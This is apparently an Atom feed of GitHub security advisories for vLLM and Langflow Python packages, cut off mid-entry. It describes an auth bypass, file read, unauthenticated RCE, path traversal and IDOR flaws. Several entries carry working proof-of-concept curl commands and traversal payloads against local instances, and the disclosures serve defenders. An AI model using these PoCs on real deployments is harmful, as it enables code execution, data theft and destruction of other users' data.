<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-06-16T17:38:32.201Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: OpenAI auth bypass]]></title>
        <id>https://github.com/advisories/GHSA-94f4-hr76-p5j6</id>
        <link href="https://github.com/advisories/GHSA-94f4-hr76-p5j6"/>
        <updated>2026-06-16T17:36:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A vulnerability in ASGI web servers and starlette's trust on those web servers enables an authentication bypass of the OpenAI API <code>AuthenticationMiddleware</code>, which was discovered during @x41sec's source code audit.
It allows to use the API without providing the configured <code>VLLM_API_KEY</code> or <code>--api-key</code>.</p>
<h3 id="details">Details</h3>
<p>In <a href="https://github.com/vllm-project/vllm/blob/v0.14.0/vllm/entrypoints/openai/api_server.py#L689-L692">https://github.com/vllm-project/vllm/blob/v0.14.0/vllm/entrypoints/openai/api_server.py#L689-L692</a> the <code>url_path</code> is taken from the <code>URL</code>, which is reconstructed by <em>starlette</em> based on the request <code>scope</code>.</p>
<pre><code class="language-py">from starlette.datastructures import URL, Headers, MutableHeaders, State

# ...

url_path = URL(scope=scope).path.removeprefix(root_path)
headers = Headers(scope=scope)
if url_path.startswith("/v1") and not self.verify_token(headers):
    response = JSONResponse(content={"error": "Unauthorized"}, status_code=401)
    return response(scope, receive, send)
return self.app(scope, receive, send)
</code></pre>
<p>The request <code>scope</code> includes the request's <code>Host:</code> header and reconstructs the URL as shown below:</p>
<pre><code class="language-py">f"{scheme}://{host_header}{path}"
</code></pre>
<p>Neither starlette nor <a href="https://asgi.readthedocs.io/en/latest/implementations.html#servers">any of the ASGI servers</a> (including uvicorn, which vllm uses) properly filter the <code>Host:</code> header for invalid characters. This allows an attacker to include special URL characters such as <code>/</code> or <code>?</code> in the <code>Host:</code> header and thereby control the reconstructed URL and it's <code>.path</code> attribute.</p>
<p>FastAPI/starlette's routing uses the HTTP path and does not depend on the parsed url.path attribute, allowing attackers to reach an endpoint via a certain path while providing a different value in the <code>.path</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Instances of vllm that use an API Key for the OpenAI API and expose the API to attackers.</li>
<li>Instances behind an RFC-conforming web server (such as nginx) are <strong>not</strong> affected.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-94f4-hr76-p5j6">https://github.com/vllm-project/vllm/security/advisories/GHSA-94f4-hr76-p5j6</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/43426">https://github.com/vllm-project/vllm/pull/43426</a></li>
<li><a href="https://x41-dsec.de/lab/advisories/x41-2026-002-starlette">https://x41-dsec.de/lab/advisories/x41-2026-002-starlette</a></li>
<li><a href="https://github.com/advisories/GHSA-94f4-hr76-p5j6">https://github.com/advisories/GHSA-94f4-hr76-p5j6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94f4-hr76-p5j6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-16T17:36:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Unauthenticated Shareable Playground arbitrary local or S3 file read]]></title>
        <id>https://github.com/advisories/GHSA-rcjh-r59h-gq37</id>
        <link href="https://github.com/advisories/GHSA-rcjh-r59h-gq37"/>
        <updated>2026-06-16T17:36:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The "Shareable Playground" (or "Public Flows" in code) contains a potential arbitrary file-read vulnerability, depending on the exact flow configuration used.</p>
<p>By making a flow public, public execution of the flow is allowed. The execution request can contain a list of files that gets read by Langflow and fed into the LLM.
The files path can be any path supported by the storage - it can be either a local file or <em>S3 path</em> if supported by the local configuration</p>
<h3 id="details">Details</h3>
<p>Shareable Playground feature works by enabling the execution of workflows by unauthenticated users, by accessing a link.
Specifically, it enables the route <code>/api/v1/build_public_tmp</code> to execute any public flow, given a public flow ID.
This request contains a <code>files</code> field that can contain a list of files. The files get read in <code>LCModelComponent._get_chat_result</code> in a call to <code>to_lc_message</code>. A detailed stacktrace:</p>
<pre><code>...
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 466, in build_vertices
    vertex_build_response: VertexBuildResponse = await _build_vertex(vertex_id, graph, event_manager)
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 324, in _build_vertex
    vertex_build_result = await graph.build_vertex(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1563, in build_vertex
    await vertex.build(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/vertex/base.py", line 770, in build
    await step(user_id=user_id, event_manager=event_manager, **kwargs)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/events/observability/lifecycle_events.py", line 95, in wrapper
    result = await observed_method(self, *args, **kwargs)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/vertex/base.py", line 411, in _build
    await self._build_results(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/vertex/base.py", line 640, in _build_results
    result = await initialize.loading.get_instance_results(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/interface/initialize/loading.py", line 76, in get_instance_results
    return await build_component(params=custom_params, custom_component=custom_component)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/interface/initialize/loading.py", line 299, in build_component
    build_results, artifacts = await custom_component.build_results()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/custom/custom_component/component.py", line 1136, in build_results
    return await self._build_with_tracing()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/custom/custom_component/component.py", line 1118, in _build_with_tracing
    results, artifacts = await self._build_results()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/custom/custom_component/component.py", line 1163, in _build_results
    result = await self._get_output_result(output)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/custom/custom_component/component.py", line 1238, in _get_output_result
    result = await method() if inspect.iscoroutinefunction(method) else await asyncio.to_thread(method)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/base/models/model.py", line 88, in text_response
    result = await self.get_chat_result(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/base/models/model.py", line 180, in get_chat_result
    return await self._get_chat_result(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/base/models/model.py", line 232, in _get_chat_result
    messages.append(input_value.to_lc_message(self.name))
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/schema/message.py", line 184, in to_lc_message
    file_contents = self.get_file_content_dicts(model_name)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/schema/message.py", line 256, in get_file_content_dicts
    content_dicts.append(create_image_content_dict(file, None, model_name))
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/utils/image.py", line 96, in create_image_content_dict
    ...
</code></pre>
<p>This triggers Langflow to feed the file into the LLM as an Image. Reading the files back depends on the specific LLM configuration.</p>
<h3 id="poc">PoC</h3>
<p>Reproduction:</p>
<ol>
<li>Create a new flow and add a Chat Input node to it</li>
<li>Share the flow ("Shareable Playground")</li>
<li>Access the public link with the browser developers tools open and execute the flow.</li>
<li>Find the <code>/api/v1/build_public_tmp</code> route and copy as cURL</li>
<li>Edit the <code>files</code> JSON field to point to any file.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Potential file read (local or S3) if shareable playground feature is used.</p>
<p>Ori Lahav
Security Researcher @ Rubrik Inc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-rcjh-r59h-gq37">https://github.com/langflow-ai/langflow/security/advisories/GHSA-rcjh-r59h-gq37</a></li>
<li><a href="https://github.com/advisories/GHSA-rcjh-r59h-gq37">https://github.com/advisories/GHSA-rcjh-r59h-gq37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcjh-r59h-gq37</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T17:36:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Unauthenticated RCE in Shareable Playgrounds]]></title>
        <id>https://github.com/advisories/GHSA-v5ff-9q35-q26f</id>
        <link href="https://github.com/advisories/GHSA-v5ff-9q35-q26f"/>
        <updated>2026-06-16T17:35:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The "Shareable Playground" (or "Public Flows" in code) contains a critical RCE vulnerability.
Simply sharing a flow exposes the deployment to RCE risk by authenticated users.</p>
<p>Tested on commit 2d67402b1dbaefcbce85a244d4a6cd5e4bda1cfe</p>
<h3 id="details">Details</h3>
<p>Shareable Playground feature works by enabling the execution of workflows by unauthenticated users, by accessing a link.
Specifically, it enables the route <code>/api/v1/build_public_tmp</code> to execute any public flow, given a public flow ID.
When the route executes the flow, it allows for providing arbitrary custom Python code as the nodes code, inside the JSON payload!</p>
<p>The vulnerable field is data.nodes[X].data.node.template.code.value. See PoC for an example.</p>
<h3 id="poc">PoC</h3>
<p>Reproduction:</p>
<ol>
<li>Create a new flow and add a Chat Input node to it</li>
<li>Share the flow ("Shareable Playground")</li>
<li>Access the public link with the browser developers tools open and execute the flow.</li>
<li>Find the <code>/api/v1/build_public_tmp</code> route and copy as cURL</li>
<li>Edit the <code>data.nodes[X].data.node.template.code.value</code> JSON field with any python code and run the cURL command.</li>
</ol>
<p>Example PoC (replace flow ID with the correct one), and download <a href="https://github.com/user-attachments/files/25159927/test_with_python.json">test_with_python.json</a>:</p>
<pre><code class="language-bash">curl 'http://localhost:7860/api/v1/build_public_tmp/&lt;flow-id&gt;/flow?start_component_id=ChatInput-syEJp&amp;log_builds=false&amp;event_delivery=streaming' \
  -H 'Content-Type: application/json' \
  -b 'client_id=anything' \
  --data-raw "$(cat test_with_python.json)"
</code></pre>
<p>Search for <code>touch /tmp/pwned</code> in the <code>test_with_python.json</code> and edit for any other code.</p>
<p>The stacktrace for the code executed is:</p>
<pre><code>...
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 495, in generate_flow_events
    ids, vertices_to_run, graph = await build_graph_and_get_order()
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 234, in build_graph_and_get_order
    graph = await create_graph(fresh_session, flow_id_str, flow_name)
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/build.py", line 298, in create_graph
    return await build_graph_from_data(
  File "/Users/ori/Work/research/langchain/langflow/src/backend/base/langflow/api/utils/core.py", line 192, in build_graph_from_data
    graph = Graph.from_payload(payload, str_flow_id, flow_name, kwargs.get("user_id"))
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1153, in from_payload
    graph.add_nodes_and_edges(vertices, edges)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 270, in add_nodes_and_edges
    self.initialize()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 512, in initialize
    self._build_graph()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1305, in _build_graph
    self._instantiate_components_in_vertices()
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/graph/base.py", line 1347, in _instantiate_components_in_vertices
    vertex.instantiate_component(self.user_id)
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/graph/vertex/base.py", line 382, in instantiate_component
    self.custom_component, _ = initialize.loading.instantiate_class(
  File "/Users/ori/Work/research/langchain/langflow/src/lfx/src/lfx/interface/initialize/loading.py", line 45, in instantiate_class
    custom_component: CustomComponent | Component = class_object(
  File "&lt;string&gt;", line 59, in __init__
</code></pre>
<h3 id="impact">Impact</h3>
<p>Unauthenticated RCE on any deployment with a shareable playground.</p>
<p>Ori Lahav
Security Researcher @ Rubrik Inc.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-v5ff-9q35-q26f">https://github.com/langflow-ai/langflow/security/advisories/GHSA-v5ff-9q35-q26f</a></li>
<li><a href="https://github.com/advisories/GHSA-v5ff-9q35-q26f">https://github.com/advisories/GHSA-v5ff-9q35-q26f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5ff-9q35-q26f</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-16T17:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: Path Traversal in Knowledge Bases API via Creation Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-79ph-745m-6wxq</id>
        <link href="https://github.com/advisories/GHSA-79ph-745m-6wxq"/>
        <updated>2026-06-16T17:35:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Langflow is vulnerable to Path Traversal in the Knowledge Bases API (<code>POST /api/v1/knowledge_bases</code>). This occurs because user-supplied knowledge base names are used directly to create file paths without proper sanitization or containment checks. An authenticated attacker can exploit this flaw to create directories and write files anywhere on the server's filesystem.</p>
<h2 id="details">Details</h2>
<p>The vulnerability exists in the <code>create_knowledge_base</code> function within <code>src/backend/base/langflow/api/v1/knowledge_bases.py</code>. </p>
<p>This function constructs file paths directly from the user-supplied <code>name</code> field without sanitization. The value is concatenated with the user's base directory and passed directly to <code>kb_path.mkdir()</code>. Immediately following the directory creation, the application writes <code>embedding_metadata.json</code> and <code>schema.json</code> into this attacker-controlled path.</p>
<h2 id="poc-proof-of-concept">PoC (Proof of Concept)</h2>
<p>For the <strong>Create</strong> endpoint, an attacker can supply traversal sequences or absolute paths in the <code>name</code> field:</p>
<p><code>../victim_user/evil_kb</code>
or
<code>/tmp/pwned</code></p>
<p>This forces <code>kb_path.mkdir()</code> to create directories and write specific application files (<code>embedding_metadata.json</code> and <code>schema.json</code>) at any reachable path on the server.</p>
<h2 id="impact">Impact</h2>
<p>Any Langflow instance exposing this endpoint to authenticated users is vulnerable. This exposes the server to:</p>
<ul>
<li><strong>Cross-user data compromise:</strong> Creation of directories and files within another tenant's knowledge base space.</li>
<li><strong>Arbitrary filesystem manipulation:</strong> Directory creation at any path on the server where the application has write permissions (e.g., <code>/app/data</code>).</li>
<li><strong>Data overwrite:</strong> Overwriting existing <code>embedding_metadata.json</code> and <code>schema.json</code> files in attacker-targeted paths, potentially corrupting existing knowledge bases.</li>
</ul>
<h2 id="fixes">Fixes</h2>
<p>The issue was addressed in <strong>PR #12337</strong>. The fix introduces the <code>_validate_kb_path_containment()</code> helper function, which uses <code>Path.is_relative_to()</code> instead of <code>startswith()</code> to enforce strict path boundaries and prevent prefix-ambiguity bugs. This helper is applied before any filesystem operations. Regression tests were added to verify that traversal payloads return a <code>403 Forbidden</code>.</p>
<h2 id="acknowledgements">Acknowledgements</h2>
<p>Thanks to the security researchers who responsibly disclosed this vulnerability:</p>
<ul>
<li>@ddlxstudio</li>
<li>@nekros1xx</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-79ph-745m-6wxq">https://github.com/langflow-ai/langflow/security/advisories/GHSA-79ph-745m-6wxq</a></li>
<li><a href="https://github.com/langflow-ai/langflow/pull/12337">https://github.com/langflow-ai/langflow/pull/12337</a></li>
<li><a href="https://github.com/advisories/GHSA-79ph-745m-6wxq">https://github.com/advisories/GHSA-79ph-745m-6wxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79ph-745m-6wxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T17:35:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Security Check Bypass via assert Statement in Activation Function Loading Allows Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-q8gq-377p-jq3r</id>
        <link href="https://github.com/advisories/GHSA-q8gq-377p-jq3r"/>
        <updated>2026-06-16T17:34:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <code>assert</code>-based security check in vLLM's activation function loading allows any unauthenticated attacker to achieve arbitrary code execution on the server by publishing a malicious HuggingFace model, when vLLM runs in Python optimized mode (<code>python -O</code> or <code>PYTHONOPTIMIZE=1</code>).</p>
<h3 id="details">Details</h3>
<p>vLLM uses an <code>assert</code> statement at <a href="https://github.com/vllm-project/vllm/blob/main/vllm/model_executor/layers/pooler/activations.py#L48"><code>vllm/model_executor/layers/pooler/activations.py:48</code></a> as its sole security control to restrict which activation functions can be loaded from a HuggingFace model's <code>config.json</code>:</p>
<pre><code class="language-python"># vllm/model_executor/layers/pooler/activations.py:35-53
function_name: str | None = None
if (
    hasattr(config, "sentence_transformers")
    and "activation_fn" in config.sentence_transformers
):
    function_name = config.sentence_transformers["activation_fn"]
elif (
    hasattr(config, "sbert_ce_default_activation_function")
    and config.sbert_ce_default_activation_function is not None
):
    function_name = config.sbert_ce_default_activation_function

if function_name is not None:
    assert function_name.startswith("torch.nn.modules."), (
        "Loading of activation functions is restricted to "
        "torch.nn.modules for security reasons"
    )
    fn = resolve_obj_by_qualname(function_name)()
</code></pre>
<p>Python's <code>assert</code> statements are stripped at compile time when running in optimized mode (<code>python -O</code> or <code>PYTHONOPTIMIZE=1</code>). When the assert is absent, the attacker-controlled <code>function_name</code> from the model's <code>config.json</code> is passed directly to <a href="https://github.com/vllm-project/vllm/blob/main/vllm/utils/import_utils.py#L106"><code>resolve_obj_by_qualname()</code></a> — an unrestricted import gadget:</p>
<pre><code class="language-python">def resolve_obj_by_qualname(qualname: str) -&gt; Any:
    module_name, obj_name = qualname.rsplit(".", 1)
    module = importlib.import_module(module_name)
    return getattr(module, obj_name)
</code></pre>
<p>This is the same vulnerability class as <strong>CVE-2017-1000433</strong> (pysaml2 assert-based auth bypass), flagged by Bandit B101 and Ruff S101, and the reason Django proactively replaced all assert-based security checks (ticket #32508).</p>
<p><strong>Attacker-controlled input sources:</strong></p>
<ul>
<li><code>config.sentence_transformers["activation_fn"]</code> (line 40)</li>
<li><code>config.sbert_ce_default_activation_function</code> (line 45)</li>
</ul>
<p><strong>Affected call sites</strong> — <code>get_act_fn()</code> is called via <code>resolve_classifier_act_fn()</code> from:</p>
<ul>
<li><code>vllm/model_executor/layers/pooler/seqwise/poolers.py:122</code> — SequencePooler</li>
<li><code>vllm/model_executor/layers/pooler/tokwise/poolers.py:130</code> — TokenPooler</li>
</ul>
<p><strong>Broader systemic risk:</strong> <code>resolve_obj_by_qualname</code> is called from ~20 locations across the codebase with no validation of its own. Any future caller feeding user-controlled input to it without validation creates the same vulnerability class.</p>
<p><strong>Suggested fix:</strong> Replace the <code>assert</code> with an explicit conditional raise:</p>
<pre><code class="language-python">if not function_name.startswith("torch.nn.modules."):
    raise ValueError(
        "Loading of activation functions is restricted to "
        "torch.nn.modules for security reasons"
    )
</code></pre>
<h3 id="impact">Impact</h3>
<p><strong>Arbitrary code execution.</strong> A malicious model author publishes a HuggingFace model with a crafted <code>config.json</code>. When a victim loads this model with vLLM running under <code>python -O</code> or <code>PYTHONOPTIMIZE=1</code>, arbitrary code executes during model initialization with the privileges of the vLLM process.</p>
<p>The attack requires:</p>
<ol>
<li>Victim loads a malicious model from HuggingFace (user interaction)</li>
<li>vLLM runs under <code>python -O</code> or <code>PYTHONOPTIMIZE=1</code> (documented in production use)</li>
<li>Model uses a cross-encoder architecture (e.g. BERT or RoBERTa with sequence classification)</li>
</ol>
<p><strong>Coordinated disclosure note:</strong> This vulnerability was also reported via huntr.com on April 2, 2026 (<a href="https://huntr.com/bounties/dcb05b04-e625-41e7-adbc-bbae0cc2d64c">https://huntr.com/bounties/dcb05b04-e625-41e7-adbc-bbae0cc2d64c</a>). A GitHub Security Advisory was also filed because it is vLLM's stated preferred disclosure channel per SECURITY.md.</p>
<h3 id="fix">Fix</h3>
<p>A fix for this was introduced in this commit: <a href="https://github.com/vllm-project/vllm/commit/b3c7ffcab82c2439726f8cb213800f6f38c023d3">https://github.com/vllm-project/vllm/commit/b3c7ffcab82c2439726f8cb213800f6f38c023d3</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-q8gq-377p-jq3r">https://github.com/vllm-project/vllm/security/advisories/GHSA-q8gq-377p-jq3r</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/b3c7ffcab82c2439726f8cb213800f6f38c023d3">https://github.com/vllm-project/vllm/commit/b3c7ffcab82c2439726f8cb213800f6f38c023d3</a></li>
<li><a href="https://huntr.com/bounties/dcb05b04-e625-41e7-adbc-bbae0cc2d64c">https://huntr.com/bounties/dcb05b04-e625-41e7-adbc-bbae0cc2d64c</a></li>
<li><a href="https://github.com/advisories/GHSA-q8gq-377p-jq3r">https://github.com/advisories/GHSA-q8gq-377p-jq3r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q8gq-377p-jq3r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T17:34:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow: IDOR/BOLA in Monitor API — Missing Ownership Enforcement on 7 Endpoints ]]></title>
        <id>https://github.com/advisories/GHSA-9c59-2mvc-vfr8</id>
        <link href="https://github.com/advisories/GHSA-9c59-2mvc-vfr8"/>
        <updated>2026-06-16T17:34:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Langflow's <code>/api/v1/monitor</code> router exposes 7 endpoints that perform read, write, and delete operations on user-owned resources — messages, sessions, build artifacts, and LLM transaction logs — without verifying that the authenticated requester owns the targeted resource. Any authenticated user can read, modify, rename, or permanently delete another user's data by supplying the target's resource ID or <code>flow_id</code>. This is a classic IDOR/BOLA vulnerability. Notably, the same source file (<code>monitor.py</code>) contains one correctly-implemented endpoint that uses an ownership check, demonstrating the correct pattern was known but inconsistently applied.</p>
<h3 id="details">Details</h3>
<p><strong>Source file: <code>src/backend/base/langflow/api/v1/monitor.py</code></strong></p>
<p>The correct pattern (used only in <code>GET /monitor/messages</code>, lines 77–80):</p>
<pre><code class="language-python">stmt = select(MessageTable)
stmt = stmt.join(Flow, MessageTable.flow_id == Flow.id)
stmt = stmt.where(Flow.user_id == current_user.id)  # ownership enforced
</code></pre>
<p>All 7 vulnerable endpoints are missing this guard:</p>
<p><strong>1. <code>GET /api/v1/monitor/builds</code> (lines 27–33)</strong> — reads build data for any <code>flow_id</code>:</p>
<pre><code class="language-python">@router.get("/builds", dependencies=[Depends(get_current_active_user)])
async def get_vertex_builds(flow_id: Annotated[UUID, Query()], session: DbSession):
    vertex_builds = await get_vertex_builds_by_flow_id(session, flow_id)  # no ownership check
    return VertexBuildMapModel.from_list_of_dicts(vertex_builds)
</code></pre>
<p><strong>2. <code>DELETE /api/v1/monitor/messages</code> (lines 102–107)</strong> — deletes any message by UUID:</p>
<pre><code class="language-python">@router.delete("/messages", status_code=204, dependencies=[Depends(get_current_active_user)])
async def delete_messages(message_ids: list[UUID], session: DbSession):
    await session.exec(delete(MessageTable).where(MessageTable.id.in_(message_ids)))
    # message_ids accepted verbatim, no ownership check
</code></pre>
<p><strong>3. <code>PUT /api/v1/monitor/messages/{message_id}</code> (lines 110–134)</strong> — overwrites any message:</p>
<pre><code class="language-python">db_message = await session.get(MessageTable, message_id)
# no check: db_message.flow_id → Flow.user_id == current_user.id
db_message.sqlmodel_update(message_dict)
</code></pre>
<p><strong>4. <code>PATCH /api/v1/monitor/messages/session/{old_session_id}</code> (lines 137–171)</strong> — renames any session:</p>
<pre><code class="language-python">stmt = select(MessageTable).where(MessageTable.session_id == old_session_id)
# no JOIN to Flow, no WHERE Flow.user_id == current_user.id
</code></pre>
<p><strong>5. <code>DELETE /api/v1/monitor/messages/session/{session_id}</code> (lines 174–188)</strong> — bulk-deletes any session:</p>
<pre><code class="language-python">await session.exec(
    delete(MessageTable).where(col(MessageTable.session_id) == session_id)
    # no ownership filter
)
</code></pre>
<p><strong>6. <code>GET /api/v1/monitor/transactions</code> (lines 191–211)</strong> — reads LLM prompt/response logs for any <code>flow_id</code>:</p>
<pre><code class="language-python">stmt = select(TransactionTable).where(TransactionTable.flow_id == flow_id)
# no JOIN to Flow, no WHERE Flow.user_id == current_user.id
</code></pre>
<p><strong>7. <code>DELETE /api/v1/monitor/builds</code></strong> — deletes build records for any <code>flow_id</code>:
Shares the same root cause as endpoint #1 (<code>GET /builds</code>): <code>flow_id</code> is accepted as a bare query parameter and passed to the deletion path without a <code>WHERE Flow.user_id == current_user.id</code> ownership check, so any authenticated user can destroy another user's build artifacts.</p>
<h3 id="poc">PoC</h3>
<p>Tested on Langflow v1.7.3 (<code>langflowai/langflow:1.7.3</code>) with two accounts: <code>langflow</code> (victim) and <code>attacker_test</code> (attacker).</p>
<pre><code class="language-bash"># Setup: authenticate both users
TOKEN=$(curl -s -X POST http://localhost:7860/api/v1/login \
  -d "username=langflow&amp;password=langflow" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

ATTKR=$(curl -s -X POST http://localhost:7860/api/v1/login \
  -d "username=attacker_test&amp;password=Attacker123" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Victim creates a flow (attacker only needs to know the flow_id — obtainable via brute force or enumeration)
FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"victim-flow","data":{"nodes":[],"edges":[]}}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# PoC 1: Read victim's LLM transaction logs (prompts + model responses)
curl -s "http://localhost:7860/api/v1/monitor/transactions?flow_id=$FLOW_ID" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200 — full transaction log returned including user prompts and model responses

# PoC 2: Read victim's build data
curl -s "http://localhost:7860/api/v1/monitor/builds?flow_id=$FLOW_ID" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200

# PoC 3: Delete victim's message (MESSAGE_ID obtained from transaction log above)
curl -s -X DELETE "http://localhost:7860/api/v1/monitor/messages" \
  -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
  -d '["&lt;victim_message_id&gt;"]'
# HTTP 204 — message deleted

# PoC 4: Tamper with victim's message content
curl -s -X PUT "http://localhost:7860/api/v1/monitor/messages/&lt;victim_message_id&gt;" \
  -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
  -d '{"text":"TAMPERED BY ATTACKER"}'
# HTTP 200 — message overwritten, "edit":true set

# PoC 5: Rename victim's session
curl -s -X PATCH \
  "http://localhost:7860/api/v1/monitor/messages/session/victim-session-1?new_session_id=attacker-controlled" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 200 — session renamed

# PoC 6: Bulk-delete victim's entire session
curl -s -X DELETE \
  "http://localhost:7860/api/v1/monitor/messages/session/victim-session-2" \
  -H "Authorization: Bearer $ATTKR"
# HTTP 204 — entire session deleted
</code></pre>
<p>All 6 demonstrated attack vectors confirmed (the 7th, <code>DELETE /builds</code>, shares the <code>GET /builds</code> root cause and was not separately scripted). After attacker operations: victim's message text read <code>"TAMPERED BY ATTACKER"</code>, session renamed to attacker-controlled name, second session completely deleted.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability affects any Langflow deployment with multiple users (team instances, SaaS deployments, enterprise self-hosted).</p>
<p><strong>Confidentiality:</strong> <code>GET /transactions</code> exposes the full LLM conversation history — user-submitted prompts and model responses — for any flow by <code>flow_id</code>. In healthcare, legal, financial, or HR deployments this directly exposes sensitive and potentially regulated data (HIPAA, GDPR). <code>GET /builds</code> exposes internal workflow execution state.</p>
<p><strong>Integrity:</strong> <code>PUT /messages/{id}</code> allows rewriting any stored message, corrupting chat history, audit trails, and RAG-indexed memory. <code>PATCH /messages/session/{id}</code> allows renaming sessions, breaking session continuity and potentially injecting victim context into attacker-controlled namespaces.</p>
<p><strong>Availability:</strong> <code>DELETE /messages</code> and <code>DELETE /messages/session/{id}</code> enable permanent, irreversible destruction of another user's conversation history and LLM logs. No recovery mechanism exists once data is deleted.</p>
<p>Any registered user account (including self-registered accounts if registration is open) has unrestricted cross-user access to all 6 operations against any other user's data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-9c59-2mvc-vfr8">https://github.com/langflow-ai/langflow/security/advisories/GHSA-9c59-2mvc-vfr8</a></li>
<li><a href="https://github.com/advisories/GHSA-9c59-2mvc-vfr8">https://github.com/advisories/GHSA-9c59-2mvc-vfr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
